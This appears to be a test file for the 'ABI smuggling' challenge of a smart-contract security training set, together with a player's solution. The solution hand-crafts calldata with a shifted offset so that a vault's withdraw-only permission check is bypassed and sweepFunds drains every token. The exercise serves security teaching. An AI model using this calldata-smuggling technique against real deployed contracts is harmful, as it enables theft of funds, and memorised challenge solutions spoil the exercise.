const { ethers } = require('hardhat')
const { expect } = require('chai')

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery
    let token, vault

    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, player, recovery] = await ethers.getSigners()

        // Deploy Damn Valuable Token contract
        token = await (
            await ethers.getContractFactory('DamnValuableToken', deployer)
        ).deploy()

        // Deploy Vault
        vault = await (
            await ethers.getContractFactory('SelfAuthorizedVault', deployer)
        ).deploy()
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0)

        // Set permissions
        const deployerPermission = await vault.getActionId(
            '0x85fb709d',
            deployer.address,
            vault.address
        )
        const playerPermission = await vault.getActionId(
            '0xd9caed12',
            player.address,
            vault.address
        )
        await vault.setPermissions([deployerPermission, playerPermission])
        expect(await vault.permissions(deployerPermission)).to.be.true
        expect(await vault.permissions(playerPermission)).to.be.true

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE)

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE)
        expect(await token.balanceOf(player.address)).to.eq(0)

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed')
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed')
    })

    it('Execution', async function () {
        /** CODE YOUR  HERE */
        async function attackWithScript() {
            const { hexZeroPad, hexConcat } = ethers.utils
            //get function selector
            const executeFn = vault.interface.getFunction('execute')
            const executeFnSelector = vault.interface.getSighash(executeFn)
            const withdrawFn = vault.interface.getFunction('withdraw')
            const withdrawFnSelctor = vault.interface.getSighash(withdrawFn)

            const target = hexZeroPad(vault.address, 32)

            //change offset from 0x40 to 0x64
            const exploitOffset = hexZeroPad(0x64, 32)
            //fill position 0x40 with 32bytes nops and 4bytes withdrawFnSelctor
            const nops = hexZeroPad(0x0, 32)
            //data size 4+32+32
            const expoitSize = hexZeroPad(0x44, 32)
            const expoitData = vault.interface.encodeFunctionData('sweepFunds', [
                recovery.address,
                token.address
            ])

            const actionData = hexConcat([
                exploitOffset, //position 0x20 32bytes
                nops, //postion 0x40 32bytes
                withdrawFnSelctor, //position 0x60 4bytes
                expoitSize, //postion 0x64 32bytes
                expoitData
            ])
            const inputData = hexConcat([executeFnSelector, target, actionData])

            const tx = {
                to: vault.address,
                data: inputData
            }

            await player.sendTransaction(tx)
        }
        await attackWithScript()
    })

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0)
        expect(await token.balanceOf(player.address)).to.eq(0)
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE)
    })
})
